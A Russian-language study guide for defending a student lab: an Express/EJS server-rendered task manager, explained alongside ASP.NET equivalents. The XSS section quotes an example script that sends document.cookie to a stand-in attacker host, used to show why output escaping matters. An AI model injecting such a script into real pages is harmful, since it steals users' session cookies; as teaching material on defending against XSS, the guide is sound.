## 0. Что вообще сделано (на одном дыхании)

Веб-приложение «менеджер задач». Пользователь открывает `http://localhost:3000/tasks`, браузер получает **готовый HTML**, сгенерированный на сервере. Все действия (создать задачу, сменить статус, удалить, приложить файл) — это **отправка обычной HTML-формы** методом POST. Сервер обрабатывает данные, сохраняет их в JSON-файл, файлы кладёт в папку `uploads/`, и отвечает **редиректом** обратно на список. Клиентского JavaScript в приложении нет вообще (кроме двух `confirm()` в атрибуте `onsubmit` — подтверждение удаления).

Ключевая фраза для защиты: **«вся логика и вся отрисовка — на сервере; клиент — тонкий, он только показывает HTML и отправляет формы»**.

## 1. Серверный рендеринг (SSR): что это и зачем

### 1.1. Три способа отдать страницу

| Подход | Кто строит HTML | Аналог в .NET | Пример |
|---|---|---|---|
| **SSR** (наш случай) | сервер | ASP.NET MVC / Razor Pages | сервер отдаёт `<li>Задача...</li>` уже готовым |
| **CSR / SPA** | браузер (JS) | Blazor WebAssembly | сервер отдаёт пустой `<div id="root">`, дальше React/Angular запрашивает JSON и рисует DOM |
| **Гибрид** | сервер + гидратация | Blazor Server / Next.js | первый HTML с сервера, потом «оживает» JS |

**Наше приложение — чистый SSR, без AJAX.** Это прямое требование задания: «Сервер должен отдавать клиенту готовую разметку, отправка данных серверу должна осуществляться через отправку форм».

### 1.2. Плюсы SSR (что говорить на защите)
* **Работает без JavaScript** — страница функциональна при отключённом JS; доступность (a11y) «из коробки».
* **Быстрый First Contentful Paint** — браузеру не надо скачивать и исполнять бандл, чтобы увидеть контент.
* **SEO** — поисковый робот видит готовый текст.
* **Простая модель данных** — одно место истины (сервер), нет проблемы синхронизации состояния клиента и сервера.
* **Безопасность** — вся валидация и авторизация на сервере, клиент нельзя «обмануть» через DevTools.

### 1.3. Минусы SSR
* **Полная перезагрузка страницы** на каждое действие → мигание, потеря позиции скролла, лишний трафик.
* **Нагрузка на сервер**: рендеринг шаблонов при каждом запросе (в SPA сервер отдавал бы только JSON).
* **Нет мгновенного отклика UI** — нельзя «оптимистично» подсветить чекбокс до ответа сервера.
* **Ограничения HTML-форм**: только GET и POST (см. §5.3), нельзя частично обновить страницу.

## 2. Node.js: что это такое

### 2.1. Определение
**Node.js — это среда выполнения JavaScript вне браузера.** Внутри:
* **V8** — движок JS от Google (JIT-компилятор, как CLR+RyuJIT для C#);
* **libuv** — библиотека на C, дающая асинхронный ввод-вывод и цикл событий;
* **стандартная библиотека** — модули `fs` (файлы), `http`, `path`, `crypto` и т.д. (аналог BCL: `System.IO`, `System.Net.Http`, `System.Security.Cryptography`).

Аналогия: **Node.js ≈ .NET Runtime, а JavaScript ≈ C#**. Как `dotnet myapp.dll` запускает IL, так `node src/server.js` запускает JS.

### 2.2. Однопоточность и Event Loop — главный теоретический вопрос

В ASP.NET Core каждый входящий запрос обслуживается потоком из **пула потоков**: 100 одновременных запросов → десятки реальных потоков.

В Node.js **весь ваш код выполняется в одном потоке**. Почему это не тормозит?

Потому что **весь ввод-вывод неблокирующий**. Когда код просит «прочитай файл», Node не ждёт — он передаёт задачу libuv (который использует пул потоков ОС для файловых операций и системные механизмы epoll/kqueue для сети), регистрирует **колбэк** и **сразу же** идёт обрабатывать следующее событие. Когда файл прочитан, колбэк ставится в очередь и выполняется, как только основной поток освободится.

Эта карусель «взять событие из очереди → выполнить его обработчик → взять следующее» и называется **Event Loop** (цикл событий).

```
        ┌──────────────────────────┐
   ┌───▶│  timers (setTimeout)      │
   │    ├──────────────────────────┤
   │    │  pending callbacks        │
   │    ├──────────────────────────┤
   │    │  poll  ← I/O: сеть, файлы │   ← здесь Node ждёт события
   │    ├──────────────────────────┤
   │    │  check (setImmediate)     │
   │    ├──────────────────────────┤
   └────│  close callbacks          │
        └──────────────────────────┘
   между фазами: микрозадачи — промисы (.then / await)
```

**Важные следствия (их любят спрашивать):**
1. **Нельзя блокировать поток.** Если написать тяжёлый синхронный цикл на 5 секунд — весь сервер «повиснет» для всех пользователей. В ASP.NET это затормозило бы только один запрос. Поэтому в коде везде асинхронные `fs/promises`, а не `fs.readFileSync`.
2. **Нет гонок внутри одного «кусочка» кода.** Между двумя строками синхронного кода никто не вклинится → не нужны `lock`, `Mutex`, `Interlocked`. Но! Гонка возможна **вокруг `await`**: пока один запрос ждёт чтения файла, второй запрос успевает выполниться целиком. Именно от этого в проекте стоит очередь операций (см. §8.3).
3. **CPU-bound задачи — слабое место Node.** Для них есть `worker_threads` (аналог `Thread`/`Task.Run`), но в вебе они нужны редко.

### 2.3. Promise и async/await
В JS это работает почти как в C#:

| C# | JavaScript |
|---|---|
| `Task<T>` | `Promise<T>` |
| `await task` | `await promise` |
| `async Task<int> F()` | `async function f()` (всегда возвращает Promise) |
| `try/catch` | `try/catch` или `.catch()` |
| `Task.WhenAll(a, b)` | `Promise.all([a, b])` |
| `TaskCompletionSource` | `new Promise((resolve, reject) => ...)` |

Отличие: в JS **нет `SynchronizationContext`** и нет `ConfigureAwait` — продолжение всегда возвращается в тот же единственный поток. И нет «синхронного ожидания» (`.Result`, `.Wait()`) — заблокировать поток попросту нечем.

В проекте: `await store.list(filter)`, `Promise.all([store.list(filter), store.counts()])` в `src/routes/tasks.js` — это буквально `await Task.WhenAll(...)`.

## 3. Модули, npm и структура пакета

### 3.1. CommonJS (то, что используется у нас)
```js
// экспорт — src/lib/statuses.js
module.exports = { STATUSES, statusLabel };

// импорт — src/app.js
const { STATUSES, statusLabel } = require('./lib/statuses');
```
`require` — **синхронная** функция, которая читает файл, исполняет его и возвращает объект `module.exports`. Результат **кэшируется**: повторный `require` того же файла вернёт тот же объект (поэтому `taskStore` — де-факто синглтон, как `AddSingleton` в DI-контейнере).

Аналогия: `require('./lib/statuses')` ≈ `using MyApp.Lib.Statuses` + доступ к `static class`.

Есть и второй стандарт — **ESM** (`import`/`export`, файлы `.mjs` или `"type": "module"` в package.json). Он асинхронный и статически анализируемый. В работе выбран CommonJS — он проще и не требует настройки.

### 3.2. `'use strict'`
Первая строка каждого файла. Включает строгий режим: запрещает необъявленные переменные, «тихие» ошибки становятся исключениями. Аналог — включённые `nullable` + `TreatWarningsAsErrors`.

### 3.3. package.json — аналог .csproj
```jsonc
{
  "name": "spp-lab1-tasks",
  "main": "src/server.js",          // точка входа
  "scripts": {                       // ярлыки команд: npm start / npm run dev
    "start": "node src/server.js",
    "dev":   "node --watch src/server.js"   // --watch = перезапуск при изменении файлов, как dotnet watch
  },
  "dependencies": {                  // ≈ <PackageReference>
    "ejs": "^3.1.10",                // ^ = «любая совместимая версия 3.x.y», семантическое версионирование
    "express": "^4.21.2",
    "multer": "^2.4.0"
  }
}
```
* **npm** — пакетный менеджер ≈ NuGet. Реестр — [npmjs.com](https://npmjs.com).
* **`node_modules/`** — папка с установленными зависимостями ≈ `~/.nuget/packages` + `obj`. В git не коммитится (см. `.gitignore`).
* **`package-lock.json`** — точные версии всего дерева зависимостей ≈ `packages.lock.json`. Гарантирует воспроизводимую сборку; **коммитится**.
* `npm install` — установить всё из package.json; `npm ci` — установить строго по lock-файлу.

### 3.4. SemVer (семантическое версионирование)
`MAJOR.MINOR.PATCH` → `4.21.2`. MAJOR — ломающие изменения, MINOR — новая функциональность обратно совместимо, PATCH — исправления. Символ `^` разрешает обновления MINOR и PATCH, `~` — только PATCH.

Фактически установлено: **Express 4.22.3, EJS 3.1.10, Multer 2.4.0, Node 24**.

## 4. Express: веб-фреймворк и конвейер middleware

### 4.1. Что такое Express
Минималистичный веб-фреймворк поверх встроенного модуля `http`. Даёт две вещи: **маршрутизацию** и **конвейер middleware**. Аналог — ASP.NET Core (Minimal API), но гораздо меньше «из коробки»: нет DI-контейнера, нет конфигурации, нет логирования — всё подключается пакетами.

Без Express пришлось бы писать так:
```js
http.createServer((req, res) => {
  if (req.url === '/tasks' && req.method === 'GET') { /* ... */ }
});
```
— то есть вручную разбирать URL, query-строку, тело запроса, заголовки. Express делает это за нас.

### 4.2. Middleware — это и есть главная идея Express

**Middleware — функция `(req, res, next)`,** через которую проходит каждый запрос. Она может: посмотреть/изменить запрос, отправить ответ и оборвать цепочку, или вызвать `next()` и передать управление дальше.

Это **буквально** тот же конвейер, что в ASP.NET Core:

```csharp
// ASP.NET Core
app.Use(async (context, next) => {
    // до
    await next();
    // после
});
app.UseStaticFiles();
app.MapControllers();
```
```js
// Express — src/app.js
app.use(express.urlencoded({ extended: false }));  // разбор форм
app.use(express.static(config.publicDir));         // отдача CSS/картинок
app.use('/tasks', tasksRouter);                    // маршруты
app.use(notFound);                                 // 404
app.use(errorHandler);                             // обработчик ошибок
```

**Порядок регистрации = порядок выполнения.** Это ключевое: если `notFound` поставить до роутера, все страницы станут 404.

Цепочка в нашем приложении для запроса `POST /tasks`:

```
Запрос → express.urlencoded → express.static (не совпало, next())
       → router '/tasks' → multer (uploadAttachments) → asyncHandler(обработчик)
       → рендер EJS или res.redirect → Ответ
   ↘ при ошибке: errorHandler (4 аргумента!)
```

### 4.3. Объекты `req` и `res`

| Что нужно | Express | ASP.NET Core |
|---|---|---|
| Параметр маршрута `/tasks/:id` | `req.params.id` | `[FromRoute] string id` |
| Query-строка `?status=done` | `req.query.status` | `[FromQuery] string status` |
| Тело формы | `req.body.title` | `[FromForm] string Title` |
| Загруженные файлы | `req.files` | `IFormFileCollection` |
| Отрисовать представление | `res.render('tasks/index', model)` | `return View(model)` |
| Редирект | `res.redirect('/tasks')` | `return RedirectToAction(...)` |
| Код ответа | `res.status(400)` | `return BadRequest()` |
| Отдать файл | `res.download(path, name)` | `return File(...)` |

### 4.4. Router — аналог контроллера
`express.Router()` — «мини-приложение», к которому можно прицепить свои маршруты и middleware, а потом смонтировать по префиксу: `app.use('/tasks', tasksRouter)`. Внутри роутера пути указываются **относительно** префикса: `router.post('/:id/delete', ...)` → реальный путь `/tasks/:id/delete`.

Это наш **контроллер** в терминах MVC.

### 4.5. `app.locals` — глобальная модель для всех шаблонов
```js
app.locals.STATUSES = STATUSES;
app.locals.statusLabel = statusLabel;
Object.assign(app.locals, format);   // formatDate, formatSize, isOverdue, ...
```
Всё, что положено в `app.locals`, доступно **в любом шаблоне** без передачи через `res.render`. Аналог — глобальные хелперы Razor / `@inject` сервиса в `_ViewImports.cshtml`. Данные конкретной страницы передаются вторым аргументом `res.render(view, data)` — это `res.locals`/модель, аналог `ViewModel`.

### 4.6. Обработка ошибок
```js
function errorHandler(error, req, res, next) { ... }   // ЧЕТЫРЕ аргумента!
```
Express отличает обработчик ошибок от обычного middleware **по количеству параметров** (`fn.length === 4`). Регистрируется последним. Аналог — `UseExceptionHandler` / глобальный `ExceptionFilter`.

**Тонкость, которую стоит упомянуть:** Express 4 **не умеет** ловить отклонённые промисы из `async`-обработчиков. Если внутри `async (req,res) => {...}` выбросить исключение, Express 4 просто «потеряет» запрос — он повиснет. Поэтому в `src/routes/tasks.js` есть обёртка:
```js
const asyncHandler = (handler) => (req, res, next) =>
  Promise.resolve(handler(req, res, next)).catch(next);
```
Она превращает любое отклонение промиса в вызов `next(error)` → попадание в `errorHandler`. В Express 5 это уже встроено.

## 5. HTTP и HTML-формы — фундамент работы

### 5.1. Анатомия HTTP
Запрос:
```
POST /tasks?status=todo HTTP/1.1
Host: localhost:3000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAbc123
Content-Length: 82914

<тело запроса>
```
Ответ:
```
HTTP/1.1 302 Found
Location: /tasks?status=todo&notice=created
```
HTTP **без состояния (stateless)**: сервер не помнит клиента между запросами. Состояние живёт либо в URL (как у нас — фильтр и `notice` передаются в query-строке), либо в cookie/сессии, либо в БД.

### 5.2. Коды ответов, используемые в работе
| Код | Где | Смысл |
|---|---|---|
| **200 OK** | обычный рендер списка | всё хорошо |
| **302 Found** | после успешного POST (`res.redirect`) | «иди по адресу из заголовка `Location`» |
| **400 Bad Request** | форма не прошла валидацию, слишком большой файл | ошибка клиента |
| **404 Not Found** | несуществующий URL или задача | не найдено |
| **500 Internal Server Error** | необработанное исключение | ошибка сервера |

### 5.3. Почему формы умеют только GET и POST

Атрибут `method` у `<form>` по спецификации HTML принимает **только `get` и `post`**. PUT/PATCH/DELETE отправить формой нельзя — они доступны только из JavaScript (`fetch`) или из HTTP-клиента. Поэтому в работе:
* удаление — `POST /tasks/:id/delete`,
* обновление — `POST /tasks/:id`.

Существует обходной приём — «method override»: скрытое поле `<input type="hidden" name="_method" value="DELETE">` + middleware `method-override`, который подменяет `req.method`. В работе он **сознательно не используется**, чтобы остаться в рамках чистого HTML. Это хороший ответ на вопрос «а почему у вас удаление через POST?».

### 5.4. Свойства HTTP-методов
* **GET — безопасный (safe) и идемпотентный**: не меняет состояние сервера, можно повторять, кэшировать, добавлять в закладки. Поэтому **фильтрация и поиск сделаны через GET** — результат отражается в URL, страницу можно переслать ссылкой и обновить без последствий.
* **POST — небезопасный и неидемпотентный**: меняет состояние, повторная отправка создаст дубль. Поэтому все изменяющие действия — POST + редирект (см. §6).

### 5.5. Кодировка тела формы — атрибут `enctype`

| enctype | Когда | Как выглядит тело |
|---|---|---|
| `application/x-www-form-urlencoded` (по умолчанию) | обычные формы | `title=Otchet&status=todo&dueDate=2026-09-20` (URL-кодирование, пробел → `+`) |
| `multipart/form-data` | **если есть файлы** | тело разбито на части разделителем `boundary`, каждая со своими заголовками |
| `text/plain` | никогда на практике | — |

**Критически важный момент для защиты:** если у формы с `<input type="file">` не поставить `enctype="multipart/form-data"`, браузер отправит **только имя файла** как текст, а содержимое потеряется. Именно поэтому в `index.ejs` и `edit.ejs` стоит:
```html
<form action="/tasks" method="post" enctype="multipart/form-data">
```

Пример тела multipart:
```
------WebKitFormBoundaryAbc123
Content-Disposition: form-data; name="title"

Подготовить отчёт
------WebKitFormBoundaryAbc123
Content-Disposition: form-data; name="attachments"; filename="Back1.jpg"
Content-Type: image/jpeg

<двоичные байты картинки>
------WebKitFormBoundaryAbc123--
```

### 5.6. Атрибут `name` — это имя поля в модели
Браузер отправляет **только** те поля, у которых есть `name`. `id` нужен лишь для связи с `<label for="...">`. Аналог — привязка модели (model binding) по имени свойства в ASP.NET.

Интересный приём из работы — быстрая смена статуса:
```html
<button type="submit" name="status" value="done">Выполнено</button>
```
У кнопки submit тоже есть `name`/`value`, и **отправляется значение именно нажатой кнопки**. Три кнопки в одной форме = три разных POST без всякого JS.

## 6. Паттерн POST/Redirect/GET (PRG)

**Проблема:** если на POST-запрос ответить HTML-страницей, то нажатие F5 заставит браузер спросить «повторить отправку данных?» и создаст дубликат задачи. Кнопка «Назад» тоже ломается.

**Решение:** на успешный POST сервер отвечает **редиректом** (302) на GET-страницу. Браузер делает новый GET, в истории остаётся только он, F5 безопасен.

```js
await store.create(values, req.files);
res.redirect(`/tasks${filterToQueryString(filter, { notice: 'created' })}`);
```

Два нюанса реализации в этом проекте:
1. **Сохранение фильтра.** Текущие `status`, `sort`, `q` подставляются и в `action` формы, и в адрес редиректа (`filterToQueryString`). Поэтому после смены статуса или удаления пользователь остаётся в той же выборке, а не «вылетает» на общий список.
2. **Сообщения об успехе** передаются параметром `?notice=created`, который `partials/notice.ejs` превращает в человеческий текст. Это упрощённый аналог **flash-сообщений** (в «взрослом» приложении их хранят в сессии — `express-session` + `connect-flash`, аналог `TempData` в ASP.NET). Сессии не подключались сознательно: лишняя зависимость для лабораторной.

**Важное исключение:** при ошибке валидации редиректа **нет** — страница рендерится прямо в ответ на POST со статусом 400. Иначе пришлось бы где-то хранить введённые пользователем данные, чтобы вернуть их в форму.

## 7. EJS — шаблонизатор (аналог Razor)

### 7.1. Как это работает
EJS берёт `.ejs`-файл, **компилирует его в JavaScript-функцию**, которая принимает объект-модель и возвращает строку HTML. Скомпилированные шаблоны кэшируются (в production). Это в точности идея Razor: `.cshtml` → сгенерированный C#-класс → `string`.

Подключение (`src/app.js`):
```js
app.set('view engine', 'ejs');           // движок по умолчанию
app.set('views', config.viewsDir);       // папка с шаблонами (≈ /Views)
```
После этого `res.render('tasks/index', model)` найдёт `src/views/tasks/index.ejs`.

### 7.2. Синтаксис — таблица соответствий с Razor

| EJS | Razor | Что делает |
|---|---|---|
| `<%= task.title %>` | `@Model.Title` | вставить значение **с HTML-экранированием** |
| `<%- html %>` | `@Html.Raw(html)` | вставить **как есть**, без экранирования |
| `<% if (x) { %> ... <% } %>` | `@if (x) { ... }` | управляющая конструкция, ничего не выводит |
| `<%- include('partials/head', {title}) %>` | `@await Html.PartialAsync("_Head", model)` | подключить частичное представление |
| `<%# комментарий %>` | `@* комментарий *@` | комментарий, не попадает в вывод |

### 7.3. `<%= %>` против `<%- %>` — вопрос про XSS (задают почти всегда)

**XSS (Cross-Site Scripting)** — атака, при которой злоумышленник сохраняет в данных HTML/JS-код, и он исполняется у другого пользователя в браузере.

Если бы название задачи выводилось через `<%- task.title %>`, то задача с названием
```html
<script>fetch('http://evil.com?c='+document.cookie)</script>
```
выполнила бы скрипт у каждого, кто откроет список.

`<%= %>` экранирует опасные символы (`<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;`, `"` → `&#34;`, `'` → `&#39;`), и код превращается в безобидный текст. **В проекте все пользовательские данные выводятся через `<%= %>`**; `<%- %>` используется только для `include`, то есть для заведомо своей разметки. Это и есть ответ на вопрос «как вы защищаетесь от XSS».

### 7.4. Переиспользование разметки
* `partials/head.ejs` + `partials/foot.ejs` — шапка/подвал ≈ `_Layout.cshtml` (EJS не имеет полноценных layout'ов, поэтому layout «разрезан» на две части).
* `partials/task-fields.ejs` — общие поля формы (название, описание, статус, дата, файл), используются и при создании, и при редактировании. Параметр `prefix` нужен, чтобы `id` элементов не совпали на одной странице (`new-title` / `edit-title`) — иначе сломается связь `<label for>`.
* `partials/notice.ejs` — единый вывод уведомлений.

### 7.5. Логика в шаблонах
В `index.ejs` есть JS-блок с функцией `buildLink()`, собирающей ссылки фильтра. Это допустимо, но «идеологически» логику лучше держать в контроллере/хелперах — именно поэтому форматирование дат и размеров вынесено в `src/lib/format.js` и прокинуто через `app.locals`.

## 8. Слой данных: JSON-файл вместо БД

### 8.1. Почему файл
Задание не требует СУБД. `data/tasks.json` — массив объектов задач. Модуль `src/store/taskStore.js` играет роль **репозитория** (`IRepository<Task>`): маршруты не знают, где физически лежат данные, и при замене на SQLite/Postgres менять нужно только этот файл.

Структура задачи:
```jsonc
{
  "id": "437e6625-…",              // crypto.randomUUID() ≈ Guid.NewGuid()
  "title": "Выпуститься",
  "description": "Дай бог",
  "status": "in_progress",          // todo | in_progress | done
  "dueDate": "2029-10-12",          // строка ISO YYYY-MM-DD, null если не задан
  "createdAt": "2026-09-14T15:09:27.428Z",   // ISO 8601 UTC
  "updatedAt": "2026-09-14T15:09:45.336Z",
  "attachments": [
    { "id": "…", "originalName": "Back1.jpg", "storedName": "9ec7072a-….jpg",
      "size": 82852, "mimeType": "image/jpeg", "uploadedAt": "…" }
  ]
}
```

**Почему даты — строки, а не `Date`?** Формат `YYYY-MM-DD` лексикографически сортируется так же, как хронологически (`"2026-01-05" < "2026-02-01"`), его без преобразований принимает и отдаёт `<input type="date">`, и он не зависит от часового пояса сервера. Сравнения `a.dueDate.localeCompare(b.dueDate)` и `task.dueDate < today()` работают корректно именно благодаря этому.

### 8.2. Атомарная запись
```js
const tmp = `${dataFile}.tmp`;
await fs.writeFile(tmp, JSON.stringify(tasks, null, 2), 'utf8');
await fs.rename(tmp, dataFile);     // атомарная операция ФС
```
Если писать прямо в `tasks.json` и процесс упадёт на середине — файл останется битым, и приложение больше не запустится. Запись во временный файл + `rename` (атомарный системный вызов в пределах одной файловой системы) гарантирует: файл либо старый целый, либо новый целый.

### 8.3. Очередь операций — «а где же lock?»

Это самый интересный теоретический момент. В C# вы бы написали `lock (_sync) { ... }` или `SemaphoreSlim`. В Node блокировок нет, потому что поток один. Но проблема **всё равно есть**:

```
Запрос A: читает файл (await) ──────────┐
Запрос B:        читает файл (await) ───┼── оба получили одинаковый массив
Запрос A: пишет [задача1] ──────────────┘
Запрос B: пишет [задача2]  ← перезаписал результат A, задача1 потеряна
```

Это **чередование (interleaving) вокруг `await`**, аналог состояния гонки. Решение в проекте — сериализация через цепочку промисов:
```js
let queue = Promise.resolve();
function serialize(operation) {
  const result = queue.then(operation, operation);  // ждём предыдущую, потом выполняем свою
  queue = result.then(() => undefined, () => undefined); // хвост не должен «отравиться» ошибкой
  return result;
}
```
Каждая новая операция подцепляется в конец цепочки и стартует только после завершения предыдущей. Это функциональный эквивалент `SemaphoreSlim(1,1)` / асинхронного мьютекса.

**Ограничение, которое честно назвать:** это работает только в пределах **одного процесса**. Если запустить несколько экземпляров приложения (кластер, PM2) — они снова начнут затирать файл. Настоящее решение — СУБД с транзакциями или файловая блокировка.

### 8.4. Фильтрация, поиск, сортировка (на сервере!)
```js
const filtered = tasks.filter(task => {
  if (status !== 'all' && task.status !== status) return false;
  if (!needle) return true;
  return task.title.toLowerCase().includes(needle) || (task.description||'').toLowerCase().includes(needle);
});
```
`filter`/`map`/`sort`/`find`/`reduce` — это LINQ без LINQ: `Where`/`Select`/`OrderBy`/`FirstOrDefault`/`Aggregate`. Отличие: JS-методы работают «жадно» (сразу возвращают массив), а LINQ — лениво (`IEnumerable`, отложенное выполнение).

Сортировка по сроку: задачи **без даты уходят в конец**, при равных датах — вторичная сортировка по дате создания (стабильный порядок). Сортировка по названию использует `localeCompare(b, 'ru')` — корректное сравнение кириллицы (аналог `StringComparer.Create(new CultureInfo("ru"), false)`), обычный `<` сравнивал бы коды UTF-16.

Важно: **фильтрация происходит на сервере**, клиент получает уже отфильтрованный HTML — это требование SSR-подхода. Счётчики на вкладках (`counts()`) при этом считаются по **всем** задачам, независимо от поискового запроса: вкладки показывают, сколько задач каждого статуса есть вообще.

## 9. Загрузка файлов: multer

### 9.1. Зачем нужен отдельный пакет
`express.urlencoded()` разбирает только `application/x-www-form-urlencoded`. Тело `multipart/form-data` — это поток с бинарными частями, его разбирает **multer** (поверх низкоуровневой библиотеки busboy). Аналог — `IFormFile` в ASP.NET, где всё встроено.

### 9.2. Конфигурация (`src/middleware/upload.js`)
```js
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, uploadsDir),
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname).slice(0,16).replace(/[^\w.]/g, '');
    cb(null, `${crypto.randomUUID()}${ext}`);   // имя на диске генерируем сами
  }
});
const upload = multer({
  storage,
  defParamCharset: 'utf8',            // иначе кириллица в именах файлов придёт в latin1 → «кракозябры»
  limits: { fileSize: 10*1024*1024, files: 5 }
});
const uploadAttachments = upload.array('attachments', 5);   // поле <input name="attachments" multiple>
```
После прохождения middleware в обработчике доступны `req.body` (текстовые поля) и `req.files` (массив объектов `{originalname, filename, path, size, mimetype}`).

Варианты API: `upload.single('file')` → `req.file`; `upload.array('files', n)` → `req.files`; `upload.fields([...])`; `upload.none()`.

Альтернатива `diskStorage` — `memoryStorage` (файл в буфере ОЗУ). Для больших файлов не годится — выберет память.

### 9.3. Безопасность загрузки — три меры (обязательно рассказать)

1. **Имя файла с диска не берётся у пользователя.** На диск кладётся `UUID + расширение`, а оригинальное имя хранится в JSON и подставляется только при скачивании. Это закрывает **path traversal**: файл с именем `../../src/app.js` не сможет перезаписать код приложения. Расширение дополнительно чистится регуляркой `[^\w.]` и обрезается до 16 символов.
2. **Лимиты** (`limits`): максимум 5 файлов за отправку, 10 МБ на файл. Без них любой может залить гигабайт и положить диск — это простейший DoS. Превышение → `MulterError` с кодом `LIMIT_FILE_SIZE` / `LIMIT_FILE_COUNT`, который ловит `errorHandler` и показывает понятное сообщение с кодом 400.
3. **Файлы не раздаются статикой.** Папка `uploads/` **не** подключена к `express.static` — доступ только через маршрут `GET /tasks/:taskId/attachments/:attachmentId`, где сервер сначала проверяет, что такая задача и такое вложение существуют. Иначе залитый `.html`-файл открылся бы в браузере с домена приложения (тот же origin!) и смог бы выполнить скрипт — это «stored XSS через загрузку».

### 9.4. Скачивание
```js
res.download(path.join(uploadsDir, attachment.storedName), attachment.originalName);
```
`res.download` = `res.sendFile` + заголовок `Content-Disposition: attachment; filename="Back1.jpg"`, который говорит браузеру «скачать под этим именем», а не показывать. Имя корректно кодируется (`filename*=UTF-8''...`) для кириллицы.

### 9.5. Уборка мусора
* При удалении задачи удаляются и её физические файлы (`removeFiles`).
* Если форма **не прошла валидацию**, уже принятые multer'ом файлы удаляются (`discardFiles`), иначе они остались бы на диске «сиротами». Важный нюанс: multer сохраняет файл на диск **до** того, как отработает ваш обработчик, поэтому убирать нужно вручную.
* Известное ограничение UX: браузер по соображениям безопасности **не позволяет** программно заполнить `<input type="file">`, поэтому после ошибки валидации файлы придётся прикрепить заново. Это ограничение платформы, а не недоработка.

## 10. Валидация

### 10.1. Два уровня
* **Клиентская** (HTML5): `required`, `maxlength="200"`, `type="date"`. Даёт мгновенную подсказку, но это **только UX** — её элементарно обойти (DevTools, curl, Postman).
* **Серверная** (`src/lib/validation.js`) — единственная, которой можно доверять. Правило: *никогда не доверяй данным от клиента*.

### 10.2. Что проверяется
* `title` — обязательно, ≤ 200 символов;
* `description` — ≤ 2000;
* `status` — только из белого списка `todo | in_progress | done` (**whitelist**, а не blacklist);
* `dueDate` — либо пусто, либо реальная дата формата `YYYY-MM-DD`. Регулярки мало: `2026-02-31` ей соответствует, но такой даты нет. Поэтому дата собирается через `Date.UTC` и проверяется обратным сравнением компонентов.

Функция возвращает `{ values, errors, valid }`, где `values` — **нормализованные** данные (`trim()`), чтобы при ошибке отрисовать форму заново с тем, что ввёл пользователь, — а не заставлять заполнять всё сначала. Аналог `ModelState.IsValid` + `asp-validation-for`.

### 10.3. Whitelist для параметров запроса
`parseFilter()` не берёт `req.query.status` напрямую, а проверяет вхождение в допустимый список, иначе подставляет `all`. То же для `sort`. Это защита от подстановки произвольных значений в дальнейшую логику.

## 11. Архитектура проекта

```
src/
├── server.js       — точка входа: app.listen(port)            ≈ Program.cs
├── app.js          — сборка приложения: движок, middleware     ≈ Startup / builder
├── config.js       — пути и настройки в одном месте            ≈ appsettings.json + IOptions
├── routes/tasks.js — HTTP-слой: маршруты, валидация, редиректы ≈ Controller
├── store/taskStore.js — доступ к данным: CRUD, фильтры         ≈ Repository / DbContext
├── lib/            — чистые функции без зависимости от HTTP    ≈ Domain / Helpers
│   ├── statuses.js   справочник статусов (одно место истины)
│   ├── validation.js правила валидации
│   └── format.js     форматирование дат/размеров для шаблонов
├── middleware/     — поперечная функциональность               ≈ Middleware / Filters
│   ├── upload.js     multer
│   └── errors.js     404 и глобальный обработчик
└── views/          — EJS-шаблоны                               ≈ /Views
```

Почему разделение именно такое:
* **Разделение ответственности (SoC)**: маршрут не знает про файловую систему, хранилище не знает про HTTP, шаблон не знает, откуда пришли данные.
* **Одно место истины**: статусы описаны один раз в `lib/statuses.js` и используются в валидации, в фильтрах, в `<select>` и в кнопках — добавление четвёртого статуса требует правки одной строки.
* **Тестируемость**: `validation.js`, `format.js`, `statuses.js` — чистые функции, их можно тестировать без поднятия сервера.
* **Заменяемость**: чтобы уйти с JSON на SQLite, достаточно переписать `taskStore.js`, сохранив его интерфейс.

**Почему `server.js` и `app.js` разделены:** `app.js` экспортирует настроенное приложение, не запуская сервер. Это позволяет подключить его в интеграционных тестах (supertest) или запустить в нескольких процессах, не дублируя конфигурацию.

## 12. Полный путь одного запроса (этот рассказ решает половину защиты)

**Сценарий: пользователь создаёт задачу с прикреплённой картинкой.**

1. Пользователь на `GET /tasks?status=todo`. Сервер: `parseFilter` → `store.list()` + `store.counts()` → `res.render('tasks/index', {...})` → EJS собирает HTML → браузер показывает список и форму.
2. Пользователь заполняет форму, выбирает файл, жмёт «Добавить задачу».
3. Браузер формирует `POST /tasks?status=todo` с `Content-Type: multipart/form-data; boundary=...`, тело — поля + байты файла.
4. Express: `express.urlencoded` пропускает (не его тип) → `express.static` не находит совпадения → роутер `/tasks` → **multer** разбирает multipart, сохраняет файл в `uploads/<uuid>.jpg`, заполняет `req.body` и `req.files`.
5. Обработчик: `validateTask(req.body)`.
   * **Ошибка:** `discardFiles(req.files)` (удаляем загруженное), `res.status(400).render('tasks/index', {form: values, errors})` — страница с подсвеченными ошибками и сохранённым вводом.
   * **Успех:** `store.create(values, req.files)` → операция встаёт в очередь → читается `tasks.json`, добавляется объект с `randomUUID()`, метаданные файлов → запись в `.tmp` → `rename`.
6. `res.redirect('/tasks?status=todo&notice=created')` → ответ **302**.
7. Браузер автоматически делает **GET** по адресу из `Location`.
8. Сервер снова рендерит список — уже с новой задачей — и `partials/notice.ejs` показывает «Задача добавлена.».
9. F5 теперь безопасен: последний запрос в истории — GET.

## 13. Слабые места и что отвечать, если спросят «а почему не сделали…»

Честно назвать ограничения — сильный ход на защите. Главное — знать, **как** бы вы их закрыли.

| Ограничение | Почему так | Как решается «по-взрослому» |
|---|---|---|
| **Нет CSRF-защиты** | нет аутентификации и cookie-сессий, красть нечего | csrf-токен в скрытом поле формы (пакет `csurf`/`csrf-csrf`), `SameSite=Lax` у cookie |
| **Нет аутентификации** | вне рамок задания | `express-session` + `passport`, либо JWT |
| **JSON вместо БД** | требования задания, наглядность | SQLite/PostgreSQL + Prisma/Knex; транзакции вместо очереди промисов |
| **Очередь работает в одном процессе** | одноэкземплярный запуск | СУБД или файловая блокировка (`proper-lockfile`) |
| **Флеш-сообщения через query-строку** | не хотелось тянуть сессии | `express-session` + `connect-flash` (аналог `TempData`) |
| **Удаление через POST, а не DELETE** | HTML-формы не умеют DELETE | `method-override` или `fetch` |
| **MIME-тип файла не проверяется** | приложение хранит любые вложения | `fileFilter` в multer + проверка сигнатуры файла (magic bytes) |
| **После ошибки валидации файлы надо прикрепить заново** | браузер запрещает заполнять file-input программно | загружать файлы отдельным запросом/во временное хранилище |
